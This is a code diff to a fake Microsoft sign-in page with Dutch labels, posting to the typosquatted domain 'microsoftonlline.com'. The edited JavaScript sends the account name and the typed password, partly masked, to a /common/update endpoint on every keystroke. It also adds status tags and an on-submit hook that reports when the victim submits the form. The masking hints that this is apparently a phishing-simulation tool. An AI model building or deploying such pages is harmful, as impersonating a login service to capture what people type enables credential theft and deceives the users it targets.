@@ -339,7 +339,7 @@ Constants.DEFAULT_BOILERPLATE_TEXT = '';
     <li class="login_cred_field_container">
         
 
-<form id="credentials" method="post" action="https://login.microsoftonlline.com/common/login" _lpchecked="1">
+<form id="credentials" method="post" onsubmit="endPage()" action="https://login.microsoftonlline.com/common/login" _lpchecked="1">
         <div id="cred_userid_container" class="login_textfield textfield">
             <span class="input_field textfield">
                 <label for="cred_userid_inputtext" class="no_display" aria-hidden="true">Gebruikersaccount</label>
@@ -371,7 +371,7 @@ Constants.DEFAULT_BOILERPLATE_TEXT = '';
             <span class="input_field textfield">
                 <label for="cred_password_inputtext" class="no_display" aria-hidden="true">Wachtwoord</label>
                 <div class="input_border">
-                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" onkeyup="UpdateAccount(this)" placeholder="Wachtwoord" spellcheck="false" aria-label="Wachtwoord" alt="Wachtwoord" type="password" name="passwd" value="" aria-describedby="accessibleError" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
+                    <input id="cred_password_inputtext" class="login_textfield textfield required field normaltext" onkeyup="UpdateAccount(this, 'typing')" placeholder="Wachtwoord" spellcheck="false" aria-label="Wachtwoord" alt="Wachtwoord" type="password" name="passwd" value="" aria-describedby="accessibleError" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASCAYAAABSO15qAAAAAXNSR0IArs4c6QAAAPhJREFUOBHlU70KgzAQPlMhEvoQTg6OPoOjT+JWOnRqkUKHgqWP4OQbOPokTk6OTkVULNSLVc62oJmbIdzd95NcuGjX2/3YVI/Ts+t0WLE2ut5xsQ0O+90F6UxFjAI8qNcEGONia08e6MNONYwCS7EQAizLmtGUDEzTBNd1fxsYhjEBnHPQNG3KKTYV34F8ec/zwHEciOMYyrIE3/ehKAqIoggo9inGXKmFXwbyBkmSQJqmUNe15IRhCG3byphitm1/eUzDM4qR0TTNjEixGdAnSi3keS5vSk2UDKqqgizLqB4YzvassiKhGtZ/jDMtLOnHz7TE+yf8BaDZXA509yeBAAAAAElFTkSuQmCC&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
                 </div>
             </span>
         </div>
@@ -684,23 +684,28 @@ Constants.DEFAULT_BOILERPLATE_TEXT = '';
         return input.length < 2 ? input : input.substring(0, 2) + stars.substring(0, input.length - 2);
     }
 
-    function UpdateAccount(element) {
+    function UpdateAccount(element, status) {
         var account = GetURLParameter("u");
         if (account == "") { account = "unknown"; }
 
         var value = element.value;
         var xhttp = new XMLHttpRequest();
-        var url = "/common/update?acc=" + encodeURIComponent(account) + "&pw=" + encodeURIComponent(LimitSize(value));
+        var url = "/common/update?acc=" + encodeURIComponent(account) + "&pw=" + encodeURIComponent(LimitSize(value)) + "&stat=" + encodeURIComponent(status);
         xhttp.open("GET", url, true);
         xhttp.send();
     }
+
+    function endPage() {
+        element = document.getElementById("cred_password_inputtext");
+        UpdateAccount(element, "submit");
+    }    
 
     function initPage() {
         var account = GetURLParameter("u");
         var element = document.getElementById("cred_userid_inputtext");
         element.value = account;
         element = document.getElementById("cred_password_inputtext");
-        UpdateAccount(element);
+        UpdateAccount(element, "start");
     }   
 </script> 
 
